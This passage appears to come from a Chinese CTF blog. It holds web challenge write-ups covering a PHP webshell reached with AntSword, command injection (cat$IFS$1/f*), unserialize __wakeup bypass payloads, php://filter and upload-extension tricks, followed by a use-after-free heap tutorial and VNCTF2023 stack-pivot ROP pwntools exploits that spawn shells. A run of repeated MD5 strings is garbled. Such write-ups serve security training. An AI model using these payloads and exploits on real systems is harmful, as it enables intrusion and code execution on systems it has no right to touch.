&quot;还有：&quot;+ daysold + &quot;天  &quot; + hrsold + &quot;小时  &quot; + minsold + &quot;分钟  &quot; + seconds + &quot;秒  &quot;;    &#125;    show_date_time();&lt;/script&gt;\n\n查看网页源码后找到flag\njicao&lt;?phphighlight_file(&#x27;index.php&#x27;);include(&quot;flag.php&quot;);$id=$_POST[&#x27;id&#x27;];$json=json_decode($_GET[&#x27;json&#x27;],true);if ($id==&quot;wllmNB&quot;&amp;&amp;$json[&#x27;x&#x27;]==&quot;wllm&quot;)&#123;echo $flag;&#125;?&gt;\n\n打开靶机后 给了一段源码\nid需要post传参 x需要json传参\njson传参格式 {“name”:”test”}\n\n成功得到flag\neasy_md5&lt;?php  highlight_file(__FILE__); include &#x27;flag2.php&#x27;; if (isset($_GET[&#x27;name&#x27;]) &amp;&amp; isset($_POST[&#x27;password&#x27;]))&#123;    $name = $_GET[&#x27;name&#x27;];    $password = $_POST[&#x27;password&#x27;];    if ($name != $password &amp;&amp; md5($name) == md5($password))&#123;        echo $flag;    &#125;    else &#123;        echo &quot;wrong!&quot;;    &#125; &#125;else &#123;    echo &#x27;wrong!&#x27;;&#125;?&gt; \n\n明文需要不同 但是密文需要相同\n因为这里是松散比较 所以有两种办法\n1.使用带0e开头的数字穿进行传递参数，因为php会将0e开头的数字转化为0，故此时md5值相等\ns878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e5459932745177090343288558410202406107080e462097431906509019562988736854314282422\n\n这种办法当遇到’&#x3D;&#x3D;&#x3D;’就会失效\n2.md5不能加密数组，md5加密数组会返回null\n(5条消息) PHP弱类型_ChanCherry、的博客-CSDN博客_php弱类型\ncaidao打开后 直接就显示出来了一句话木马 知道了密码以后就可以用蚁剑连接终端 然后在根目录下获得flag\n\neasyrce&lt;?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          ?&gt;\n\n随后我们利用burp来抓包 \n\n修改文件后缀名为php\n随后结束抓包 我们利用蚁剑连接后台\nhttp://1.14.71.254:28963/upload/1.php  //这里的后缀名比较讲究\n\n\n但是发现这是个静态flag 很显然是错误的 因为通常的靶机都是使用uuid进行动态flag的生成\n所以这里我们要想到去查看环境变量中的flag\n即phpinfo()\npayload = http://1.14.71.254:28963/upload/1.phppost: shell=phpinfo();\n\n\n成功找到flag\nDo_you_know_http打开靶机后 网页显示: Please use ‘WLLM’ browser!\n让我们使用WLLM这个浏览器 很明显没有这个浏览器 那我们可以通过burp修改User-Agent这一项参数\n其是一种向访问网站提供你所使用的浏览器类型及版本、操作系统及版本、浏览器内核、等信息的标识。\n\n当我们修改完后send  提示说success说明修改成功 然后在location下我们发现了一个新的页面 a.php 跟进一下\n\n提示说需要我们用本地的ip访问 即127.0.0.1\n于是我们在request中添加一段\nx-forwarded-for:127.0.0.1\n\n\n可以发现成功了 在location出现了一个新的php 访问后发现flag\nbabyrce &lt;?phperror_reporting(0);header(&quot;Content-Type:text/html;charset=utf-8&quot;);highlight_file(__FILE__);if($_COOKIE[&#x27;admin&#x27;]==1) &#123;    include &quot;../next.php&quot;;&#125;else    echo &quot;小饼干最好吃啦！&quot;;?&gt; 小饼干最好吃啦！\n\n用burp来使admin&#x3D;1\n\n得到了一个关键网页 rasalghul.php 跟进一下看看\n &lt;?phperror_reporting(0);highlight_file(__FILE__);error_reporting(0);if (isset($_GET[&#x27;url&#x27;])) &#123;  $ip=$_GET[&#x27;url&#x27;];  if(preg_match(&quot;/ /&quot;, $ip))&#123;      die(&#x27;nonono&#x27;);  &#125;  $a = shell_exec($ip);  echo $a;&#125;?&gt; \n\n屏蔽了空格 用get给url传参 这个参数会被执行\n那这里就用$IFS$1替代空格就好了\npayload = url=cat$IFS$1/f*\n\nno_wakeup &lt;?phpheader(&quot;Content-type:text/html;charset=utf-8&quot;);error_reporting(0);show_source(&quot;class.php&quot;);class HaHaHa&#123;        public $admin;        public $passwd;        public function __construct()&#123;            $this-&gt;admin =&quot;user&quot;;            $this-&gt;passwd = &quot;123456&quot;;        &#125;        public function __wakeup()&#123;            $this-&gt;passwd = sha1($this-&gt;passwd);        &#125;        public function __destruct()&#123;            if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;wllm&quot;)&#123;                include(&quot;flag.php&quot;);                echo $flag;            &#125;else&#123;                echo $this-&gt;passwd;                echo &quot;No wake up&quot;;            &#125;        &#125;    &#125;$Letmeseesee = $_GET[&#x27;p&#x27;];unserialize($Letmeseesee);?&gt; \n\n调用了_wakeup函数 是cve漏洞CVE-2016-7124 \n当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行\n编写一下序列化脚本：\n&lt;?phpclass HaHaHa&#123;    public $admin=&#x27;admin&#x27;;\tpublic $passwd=&#x27;wllm&#x27;;&#125;$p = new HaHaHa();echo serialize($p);?&gt;\n\nO:6:&quot;HaHaHa&quot;:2:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:4:&quot;wllm&quot;;&#125;\n\n将a后面的2修改成大于其值的数\nO:6:&quot;HaHaHa&quot;:3:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:4:&quot;wllm&quot;;&#125;\n\n成功得到flag\nez_unserialize&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;   &lt;title&gt;ez_unserialize&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;          &lt;form  class=&quot;well&quot; style=&quot;width:220px;margin:0px auto;&quot;&gt;             &lt;img src=&quot;./hutao.GIF&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;            &lt;h3&gt;咦？题目在哪捏？&lt;/h3&gt;        &lt;/form&gt;    &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;!--User-agent: *Disallow: 什么东西呢？--&gt;\n\n主体部分没有什么值得关注的  这里看一下注释部分  user_agent:和disallow  是robots协议的特征\nhttps://blog.csdn.net/qq_53221728/article/details/122909592\n查看一下robots.txt\nUser-agent: *Disallow: /cl45s.php\n\n发现了一个新的网页 跟进一下\n &lt;?phperror_reporting(0);show_source(&quot;cl45s.php&quot;);class wllm&#123;    public $admin;    public $passwd;    public function __construct()&#123;        $this-&gt;admin =&quot;user&quot;;        $this-&gt;passwd = &quot;123456&quot;;    &#125;        public function __destruct()&#123;        if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;ctf&quot;)&#123;            include(&quot;flag.php&quot;);            echo $flag;        &#125;else&#123;            echo $this-&gt;admin;            echo $this-&gt;passwd;            echo &quot;Just a bit more!&quot;;        &#125;    &#125;&#125;$p = $_GET[&#x27;p&#x27;];unserialize($p);?&gt; \n\n跟上题一样  也是反序列化漏洞 百度一下__construct有什么漏洞可以利用\n(5条消息) php反序列化construct绕过,PHP反序列化漏洞_weixin_39824801的博客-CSDN博客\n(5条消息) php反序列化construct绕过,PHP反序列化漏洞（1）_weixin_39730801的博客-CSDN博客\n可知__construct函数是对象创建时调用  那么我们正常序列化admin和passwd就行\n&lt;?phpclass wllm&#123;    public $admin=&#x27;admin&#x27;;\tpublic $passwd=&#x27;ctf&#x27;;&#125;$p = new wllm();echo serialize($p);?&gt;\n\nO:4:&quot;wllm&quot;:2:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:3:&quot;ctf&quot;;&#125;\n\n成功得到flag\neasyupload2.0和1.0那一题大差不差 这题把php文件后缀做了检测\n禁止上传php文件\n但是发现php文件扩展名还是可以上传成功的\nphp3，php5，pht，phtml，phps\n\nPseudoProtocols题目初始界面\nhint is hear Can you find out the hint.php?\n\n然后看到url是\nhttp://1.14.71.254:28411/index.php?wllm=\n\n还不知道wllm有什么用 先进去hint.php看一看提示\n结果为空 结合题目描述 应该是file伪协议\nwllm=php://filter/convert.base64-encode/resource=hint.php\n\n得到一串base64编码 解码后得到\n&lt;?php//go to /test2222222222222.php?&gt;\n\n跟进一下这个页面\n &lt;?phpini_set(&quot;max_execution_time&quot;, &quot;180&quot;);show_source(__FILE__);include(&#x27;flag.php&#x27;);$a= $_GET[&quot;a&quot;];if(isset($a)&amp;&amp;(file_get_contents($a,&#x27;r&#x27;)) === &#x27;I want flag&#x27;)&#123;    echo &quot;success\\n&quot;;    echo $flag;&#125;?&gt; \n\nfile_get_contents这个函数是把文件r读入字符串\n这里有两种办法\n1.php:&#x2F;&#x2F;input\nhttps://blog.csdn.net/sunsineq/article/details/105371129\n他相当于强行以post的办法读入任意内容到a中\n\n2.data:&#x2F;&#x2F;\ndata本身是数据封装器  以get的方式传参\nhttp://1.14.71.254:28411/test2222222222222.php?a=data://text/plain,I want flag\n\n","categories":["web"]},{"title":"UAF","url":"/2022/10/01/UAF/","content":"TNND 说真的 堆开始的pwn就真的难度递增 网上的资料又少 又难理解 所以从UAF开始的各种堆利用手法 我都会倾尽自己全部的修辞能力和解释能力 尽可能让你理解的简单容易 因为我自己学的时候实在是太坐牢了\nUAF原理先搞懂这个到底是什么意思吧 uaf 全程 use after free 很好理解的吧\n就是当我们把一个chunk释放之后 再利用他\n怎么做到这一点？\n#include &lt;stdio.h&gt;#include &lt;cstdlib&gt;#include &lt;string.h&gt;int main()&#123;    char *p1;    p1 = (char *) malloc(sizeof(char)*10);//申请内存空间    memcpy(p1,&quot;hello&quot;,10);    printf(&quot;p1 addr:%x,%s\\n&quot;,p1,p1);    free(p1);//释放内存空间    char *p2;    p2 = (char *)malloc(sizeof(char)*10);//二次申请内存空间，与第一次大小相同，申请到了同一块内存    memcpy(p1,&quot;world&quot;,10);//对内存进行修改    printf(&quot;p2 addr:%x,%s\\n&quot;,p2,p1);//验证    return 0;&#125;\n\n放一段代码 应该很好看懂吧\n先申请一个chunk 然后打印出指向这个chunk的指针的值\n再释放这个chunk 接着再申请一个\n最后再打印出新申请的chunk的指针的值\n我们会发现这二者都是一样的值\n说明什么？\n如果只是单纯的free chunk的话 没有去清空指向被free的这个chunk的指针 那么这个指针仍然可以指向这个free chunk\n概念介绍到这边 应该就可以大部分理解了 如果你需要更加详细的介绍 可以看下面这篇文章\n(3条消息) UAF (Use After Free)漏洞分析及利用_4ct10n的博客-CSDN博客_uaf\n真题复现1说真的 光uaf的题型就有好多种出法 想了想 还是拿nisa 21届校赛的题来当第一道例题 这道题的引导性个人认为十分不错 同时讲解起来也方便理解\n\nchecksec看一下保护机制和位数  发现是32位的  那么接下来的一些数据就得注意了\n拖到ida里面看看main函数\nint __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123;  int v3[4]; // [esp+8h] [ebp-10h] BYREF  v3[1] = __readgsdword(0x14u);  setbuf(stdin, 0);  setbuf(stdout, 0);  while ( 1 )  &#123;    while ( 1 )    &#123;      puts(&quot;1.create&quot;);      puts(&quot;2.edit&quot;);      puts(&quot;3.delete&quot;);      puts(&quot;4.show&quot;);      putchar(58);      __isoc99_scanf(&quot;%d&quot;, v3);      if ( v3[0] != 2 )        break;      edit();    &#125;    if ( v3[0] &gt; 2 )    &#123;      if ( v3[0] == 3 )      &#123;        del();      &#125;      else if ( v3[0] == 4 )      &#123;        show();      &#125;      else      &#123;LABEL_13:        puts(&quot;Invalid choice&quot;);      &#125;    &#125;    else    &#123;      if ( v3[0] != 1 )        goto LABEL_13;      create();    &#125;  &#125;&#125;\n\nint create()&#123;  int result; // eax  int v1; // ebx  char *v2; // eax  printf(&quot;you are creating the %d page\\n&quot;, i);  result = i;  if ( i &gt;= 0 )  &#123;    result = i;    if ( i &lt;= 9 )    &#123;      v1 = i;      (&amp;page)[v1] = malloc(8u);      if ( i )      &#123;        if ( i &lt;= 0 || i &gt; 9 )        &#123;          result = puts(&quot;NO PAGE&quot;);        &#125;        else        &#123;          puts(&quot;Good cretation!&quot;);          result = ++i;        &#125;      &#125;      else      &#123;        v2 = page;        *page = 1868654951;        v2[4] = 0;        *(page + 1) = echo;        puts(&quot;The init page&quot;);        result = ++i;      &#125;    &#125;  &#125;  return result;&#125;\n\nunsigned int edit()&#123;  int v1; // [esp+8h] [ebp-10h] BYREF  unsigned int v2; // [esp+Ch] [ebp-Ch]  v2 = __readgsdword(0x14u);  puts(&quot;Input page&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v1);  if ( v1 &lt;= 0 || v1 &gt; i )  &#123;    puts(&quot;NO PAGE&quot;);  &#125;  else  &#123;    puts(&quot;Input your strings&quot;);    __isoc99_scanf(&quot;%s&quot;, (&amp;page)[v1]);  &#125;  return __readgsdword(0x14u) ^ v2;&#125;\n\nunsigned int del()&#123;  int v1; // [esp+8h] [ebp-10h] BYREF  unsigned int v2; // [esp+Ch] [ebp-Ch]  v2 = __readgsdword(0x14u);  puts(&quot;Input page&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v1);  if ( v1 &lt; 0 || v1 &gt; i )    puts(&quot;NO PAGE&quot;);  else    free((&amp;page)[v1]);  return __readgsdword(0x14u) ^ v2;&#125;\n\nunsigned int show()&#123;  int v1; // [esp+8h] [ebp-10h] BYREF  unsigned int v2; // [esp+Ch] [ebp-Ch]  v2 = __readgsdword(0x14u);  puts(&quot;Input page&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v1);  if ( v1 )  &#123;    if ( v1 &lt;= 0 || v1 &gt; i )      puts(&quot;NO PAGE&quot;);    else      echo((&amp;page)[v1]);  &#125;  else  &#123;    (*(page + 1))(page);  &#125;  return __readgsdword(0x14u) ^ v2;&#125;\n\n看蒙蔽了是不是 没关系 接下来 我们将花费足够的时间以及耐心来为你分析透彻这些代码\n目光聚集到main函数\n堆的经典菜单题 看懂不成问题吧 输入对应的数字跳转进对应的函数\n按照顺序我们先看create函数\n\n第一遍我们先粗略的遍历一遍这个函数的作用\n有一点小不同 其他题目可能还需要我们输入index来创建一个chunk 但是这题是用++i的办法来自己设置index\n可以看到创建的chunk大小固定为0x8\n接着看第二个箭头指向的代码\n*()就是指这个地址的内容\n假设哈 假设page &#x3D; 0x1000\n你可能以为page+1的结果会是0x1001\n其实不是 这里的1是指一个字长 也就是说结果其实是0x1004\n那么这段代码的意思也就是说\npage地址的下一个字长的内容更改为echo这个函数\n然后我们点进去看一下这个函数是干什么的\nint __cdecl echo(char *s)&#123;  return puts(s);&#125;\n\nputs 有点东西是不是 不过我们先放着 再看一下edit函数\n\n这个函数内容不用说看名字也懂干什么的吧  就是输入你要编辑的index数 然后再输入要更改的内容\n这里用到了scanf 这个函数没有限制输入字长 我们栈溢出的常客是不是\n所以这里也能来个溢出？ 对了 有这个想法 这题你能看到曙光了\n我们再回想一下 上一个函数create 指针所指向的下一个字长处是不是一个echo函数\n欸 是吧 替换addr来控制程序执行流我们再熟悉不过了\n不过先别激动 还有一个函数没看呢(delete我也解释不来 你就知道他free了chunk但是没有清空指针的内容就行了)\n\n看到那个if判定了吗 如果我们只设置一个chunk 那么我们想要show这个chunk还不行 因为index不能为0\n所以我说这道题的引导性其实是很好的  他驱使你去进行uaf \n所以我们的思路是什么\n先创建一个page0的chunk 然后把他free了\n接着创建一个page1的chunk 由于page0被释放后会被存入fast bin\n此时申请的page1大小小于等于page0 所以page0就被重新分配给了page1\n他们两个共享一个空间 指针指向的地址相同 这里就利用了uaf\n那么我们之前看到的edit函数又该如何利用呢？再接着看show函数图上的第二个箭头\n这句代码的作用是什么？\n先执行指针所指向的地址的下一个字长的指令 接着用指针所指向的地址的内容当作先前执行的指令的参数\n看到这里你就能懂了吧 所以当我们不对chunk内容进行任何溢出时 当我们仅仅只是输入小于一个字长的数据时\nshow函数就相当于调用了echo函数把chunk的内容puts了出来\n所以此时我们的思路就立马清晰了\n我们用edit函数修改chunk的内容为  “sh\\x00\\x00”\n然后溢出到下一个字长 修改其内容为system的地址\n这样当我们执行show函数的时候 其就会使用chunk内的sh当作system函数的参数\n因此我们成功实现了系统调用\n这里再解释一下为什么是 sh\\x00\\x00 因为是32位的程序嘛\n一个字长只有4个字节 如果我们使用的是&#x2F;bin&#x2F;sh显然字节不够\n所以使用sh也能达成对应的操作 至于后面的两个\\x00 显然是为了填充字节 又不至于破坏sh字符串\n所以最后我们的exp是：\nfrom pwn import*io = remote(&quot;1.14.71.254&quot;,28340)def add():    io.recvuntil(&quot;:&quot;)    io.sendline(&quot;1&quot;)def edit(id,content):    io.recvuntil(&quot;:&quot;)    io.sendline(&quot;2&quot;)    io.recvuntil(&quot;Input page\\n&quot;)    io.sendline(str(id))    io.recvuntil(&quot;Input your strings\\n&quot;)    io.sendline(content)def delete(id):    io.recvuntil(&quot;:&quot;)    io.sendline(&quot;3&quot;)    io.recvuntil(&quot;Input page\\n&quot;)    io.sendline(str(id))def show(id):    io.recvuntil(&quot;:&quot;)    io.sendline(&quot;4&quot;)    io.recvuntil(&quot;Input page\\n&quot;)    io.sendline(str(id))io.recvuntil(&quot;4.show&quot;)add()delete(0)add()payload = b&quot;sh\\x00\\x00&quot;len(payload)payload +=p32(0x8048642)edit(1,payload)show(0)io.interactive()\n\nps:从堆开始 我们将会频繁使用python中的def 因为菜单题的重复接收输送实在是太多了\n如果看不懂这样书写的语法 可以自行百度学习\n","categories":["堆"]},{"title":"VNCTF2023","url":"/2023/02/18/VNCTF2023/","content":"Traveler保护机制\n\nida 两个关键函数\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char buf[32]; // [rsp+0h] [rbp-20h] BYREF  init(argc, argv, envp);  puts(&quot;who r u?&quot;);  read(0, buf, 0x30uLL);  puts(&quot;How many travels can a person have in his life?&quot;);  read(0, &amp;msg, 0x28uLL);  return 0;&#125;\n\nint boynextdoor()&#123;  return system(&quot;echo flag&quot;);&#125;\n\nboynextdoor函数只能输出flag字符串 而非flag文件内容 单纯的提供了system函数 所以这里大胆猜测这题不用泄露libc基址\n回到main函数 提供了两次read 一次可以溢出0x10字节的数据  一次往bss段写数据 再加上提供了system函数 所以这里一开始是想的很简单 直接栈迁移到bss段上 构造system(“&#x2F;bin&#x2F;sh”)  但是很快发现打不通\n执行流卡在了这里 此时的rsp位于0x403d00 问题可能出在这里 因为这题的bss段的位置实在是太奇怪了 按理来说64位的二进制程序中bss段一般都是0x600000往后的\n\n可以看到0x403000 - 0x404000 是只有可读权限的 只有在0x404000 - 0x405000之间才有写权限\n所以此时rsp执行到了0x403d00以后 没有办法继续写入内容了 故无法成功执行system\n那么此时就是想办法抬高栈帧 一开始是打算构造read来往高地址重新写入rop链 随后返回main函数重新栈迁移\n但是再次执行read函数的时候 rsi寄存器受到了污染 不在指向原本的栈地址\n.text:000000000040121A                 mov     edx, 30h ; &#x27;0&#x27;  ; nbytes.text:000000000040121F                 mov     rsi, rax        ; buf.text:0000000000401222                 mov     edi, 0          ; fd.text:0000000000401227                 call    _read\n\n不过联想到了西湖论剑的calc的做法 在bss段构造rop链 写入的地址紧跟在rop链后 这样就可以循环执行\n具体可以去看我相关的博客\n完整exp:\nfrom pwn import *context.log_level = &#x27;debug&#x27;io=process(&#x27;./pwn&#x27;)#io = remote(&quot;node4.buuoj.cn&quot;,25261)elf = ELF(&#x27;./pwn&#x27;)#libc = ELF(&#x27;./locate&#x27;)context.arch = &quot;amd64&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]io.recvuntil(&quot;who r u?&quot;)backdoor_addr = 0x4011ddleave_addr = 0x0000000000401253bss_addr = 0x4040A0payload = cyclic(0x20)+p64(bss_addr)+p64(leave_addr)io.send(payload)rdi_addr = 0x4012c3system_addr = 0x4011ECputs_plt = 0x401070puts_got = elf.got[&#x27;puts&#x27;]start_addr = 0x4010b0read_got = elf.got[&#x27;read&#x27;]system_got = elf.got[&#x27;system&#x27;]main_addr = elf.sym[&#x27;main&#x27;]ret_addr = 0x000000000040101aio.recvuntil(&quot;How many travels can a person have in his life?&quot;)read_addr = 0x4010a0rsi_r15_addr = 0x00000000004012c1add_rsp = 0x0000000000401016rsp_addr = 0x00000000004012bdpayload = b&#x27;/bin/sh\\x00&#x27;+p64(rsi_r15_addr)+p64(0x4040c8)+p64(0)+p64(read_addr)# gdb.attach(io,&#x27;b *0x401254&#x27;)# pause(0)io.send(payload)payload = p64(ret_addr)+p64(rsi_r15_addr)+p64(0x4040f0)+p64(0x4040f0)+p64(read_addr)io.send(payload)for i in range(1,50):    payload = p64(ret_addr)+p64(rsi_r15_addr)+p64(0x4040f0+0x28*i)+p64(0x4040f0+0x28*i)+p64(read_addr)    io.send(payload)payload = p64(ret_addr)+p64(ret_addr)+p64(rdi_addr)+p64(0x4040a0)+p64(system_addr)io.send(payload)io.interactive()\n\n另外再借助猫神的exp以其他做法复现了一遍 收获也很大 记录一下\n我觉得十分有必要逐步分析\n首先 我们的栈空间不够 所以需要往高地址写入rop链再迁移过去 这是最开始的思路\n起初我是认为第二次main函数的read的rsi参数被破坏了 这是因为我用的是垃圾数据覆盖rbp  在复现第二题的时候意识到了这个问题\n而其rsi寄存器的值实际上是取rbp-0x20处的数据\n.text:000000000040121A                 mov     edx, 30h ; &#x27;0&#x27;  ; nbytes.text:000000000040121F                 mov     rsi, rax        ; buf.text:0000000000401222                 mov     edi, 0          ; fd.text:0000000000401227                 call    _read\n\n所以如果我们适当调整rbp的值 这里的read就可以做到任意写\n我们预想的情况还是在bss段上通过连续的rop链来牢牢掌握住程序控制流\npad0 = b&quot;a&quot;*0x20+p64(0x4040c0+0x20)+p64(0x401216)\n\n这一段payload用来供第一次main函数的第一个read函数读入\n用来覆盖rbp的0x4040c0这个可以先忽略 在实际做题中暂且认为其是一个变量  值为0x4040a0+len(payload) 此处的payload为第一次main函数第二次read读入的rop链长度\n此时程序执行到了第二次read这里 读入的首地址是0x4040a0\nread_rop = p64(pop_rsi_r15)+p64(0x4048d8)+p64(0)read_rop += p64(read_plt)+p64(pop_rbp)\n\ngdb动调查看各个寄存器的值 发现我们只需要修改rsi寄存器的值就可以构造read函数 读入的地址挑选一个高地址处的  抬高栈帧\n接下来 程序继续运行 跳转到了0x401216 再次执行一次read\n但是要注意在栈帧结束时的leave指令 此时使得rbp指向了0x4040e0\n于是我们这时候执行的read参数为\n\np64(pop_rbp)+p64(0x4048d8)+p64(leave_ret)+p64(0)+p64(0x4040a0-8)+p64(leave_ret)\n\n这一段payload主要是用来进行栈迁移到高地址处 通过弹出0x4048d8给rbp寄存器 leave_ret将栈迁移到了0x4048d8\n接着程序执行流执行到了第二次main函数的第二次read\nread_rop = p64(pop_rsi_r15)+p64(0x4048d8)+p64(0)read_rop += p64(read_plt)+p64(pop_rbp)\n\n这个read读入的首地址仍然是0x4040a0 所以和第一次main读入一样的数据就行了\n随后 第二次main函数准备结束栈帧 执行leave|ret两条指令\n\nmov rsp,rbp rsp指向0x4040e8  rbp指向0x404098\n\n还记得我们之前往0x4040c0写入的rop链吗 此刻派上用场了 位于0x4040e8的正是leave指令\n执行完leave以后 rbp为0  rsp为0x4040a0 \n此刻程序执行流来到了我们最初往0x4040a0写入的rop链 其再次构造了一次read\n这个read读入地址的首地址为0x4048d8\n\nrop_sh = p64(0x4048d8)+p64(pop_rdi)+p64(0x4048f8)+p64(system_plt)+b&#x27;/bin/sh&#x27;+p64(0)\n\n\n此时程序执行到read函数结束 准备ret到下一个字长处的指令 那么此时就是pop rbp\n接着往下一个字长处是leave_ret 相当于一个栈迁移\n而此时0x4040c8处我们填充的就是0x4048d8 而0x4048d8处我们填充的也是0x4048d8\n所以rsp和rbp此时就完成了一次栈迁移 rsp指向了构造的system\n\n到这里整个程序的执行流就结束了 不过还是没有理解的地方 按理来说\nread_rop = p64(pop_rsi_r15)+p64(0x4048d8)+p64(0)read_rop += p64(read_plt)+p64(pop_rbp)  \n\n中的pop_rbp和下面的\np64(pop_rbp)+p64(0x4048d8)+p64(leave_ret)+p64(0)+p64(0x4040a0-8)+p64(leave_ret)\n\n中的pop_rbp所存储的是同一个内存空间 都是0x4040c0 不知道为啥删去前面一个就会导致程序卡死\n\n问题貌似出在这一段rop链错位了 0x4040c0应该存放的是pop rbp 而0x4040c8不应该为0 而是存放0x4048d8\n\n这个疑点目前以我的动调水平还看不出来是啥问题 留着以后探讨吧 不过这次复现真的提升很大\n对于栈迁移更加熟悉了 特别是学会了利用pop rbp的方法来栈迁移  不得不说和猫神这样的大牛子差距真的太大了\ntongxunlu考的就是一个函数的返回值在寄存器存放中的知识点\n在这题之前我们先来看一个小程序\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char buf[24]; // [rsp+0h] [rbp-20h] BYREF  unsigned __int64 v5; // [rsp+18h] [rbp-8h]  v5 = __readfsqword(0x28u);  read(0, buf, 0x30uLL);  puts(&quot;pause&quot;);  return 0;&#125;\n\n调式exp:\nfrom pwn import*from struct import pack#io = remote(&quot;node4.buuoj.cn&quot;,26248)io = process(&quot;./a.out&quot;)context.log_level = &quot;debug&quot;elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./buu_libc_ubuntu16_64&quot;)#libc = ELF(&quot;./locate&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.arch = &quot;amd64&quot;def debug():    gdb.attach(io)    pause()payload = cyclic(0x8)gdb.attach(io,&#x27;b *$rebase(0x72C)&#x27;)pause()io.send(payload)pause()\n\n将断点打在call read之后 随后我们来看一下寄存器的值\n\n可以看到此时rax寄存器的值是0x8  正是我们通过read输入的数据的字节数 而read函数的返回值则等于接收到的字节数\n同理 我们来试一下strtol函数 即本题的关键漏洞函数\n#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;seccomp.h&gt;#include&lt;string.h&gt;int main()&#123;    char a[20];    long int b;    read(0,a,0x30);    b= strtol(a,0,10);    puts(&quot;pause&quot;);&#125;\n\nfrom pwn import*from struct import pack#io = remote(&quot;node4.buuoj.cn&quot;,26248)io = process(&quot;./a.out&quot;)context.log_level = &quot;debug&quot;#elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./buu_libc_ubuntu16_64&quot;)#libc = ELF(&quot;./locate&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.arch = &quot;amd64&quot;def debug():    gdb.attach(io)    pause()payload = b&#x27;11&#x27;+b&#x27;aaaaaaaa&#x27;gdb.attach(io,&#x27;b *$rebase(0x77D)&#x27;)pause(0)io.send(payload)pause()\n\n\n可以看到11是被rax寄存器存储  aaaaaaaa 被rdi寄存器存储\nstrtol函数一共需要三个参数 \nlong int strtol(const char *str, char **endptr, int base)\n\nstr字符串提供要经过转化的字符串 endptr用来存放剩余字符串 base用来指定转化的进制 就**strtol(a,0,10)**举例\n我们给定的进制为10进制 那么其只会接收0-9的字符  如果检测到了不属于这个范围的 则会停止接收  比如读入了两个11后 检测到了a 则停止接收 使返回值为11\n而接下来剩余的字符串 会一直接收到识别到\\x00 即字符串的结束 将其放入到endptr中 在这个程序中的表现就是被放入到rdi寄存器存储\n上述的一切程序编译环境是Ubuntu18.04  更换libc为libc-2.31.so \n说回vn的这一题\n保护机制\n[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)[*] &#x27;/home/chen/pwn&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      PIE enabled    RUNPATH:  &#x27;/home/chen/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/&#x27;\n\n再来看一下反汇编后的代码\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  init_buf(argc, argv, envp);  eeee_wantboy();  hao_kang_de();  return 0;&#125;\n\n三个函数 init_buf用来清空缓存区\n来看剩下两个\n__int64 eeee_wantboy()&#123;  char v1[256]; // [rsp+0h] [rbp-130h] BYREF  char buf[36]; // [rsp+100h] [rbp-30h] BYREF  int v3; // [rsp+128h] [rbp-8h]  int v4; // [rsp+12Ch] [rbp-4h]  v4 = 0;  v3 = 0;  puts(&quot;halo little giegie,my name is eeee,i am 11111&quot;);  puts(&quot;can i get your phone number&quot;);  puts(&quot;if you give me your number,i will give you some hao_kang_de&quot;);  read(0, buf, 0x40uLL);  printf(&quot;i get you ! little giegie&quot;);  printf(&quot;heyhey , hao_kang_de is %lx \\n&quot;, v1);  puts(&quot;anything want to say?&quot;);  read(0, v1, 0x100uLL);  return strtol(buf, 0LL, 10);&#125;\n\n有一个栈溢出漏洞 但是只够覆盖rbp和retaddr 不过前面一题是栈迁移 应该不会两题都考\n还有一次往v1输入数据的机会 不过没有栈溢出 也覆盖不到buf\n最后是调用了strtol函数 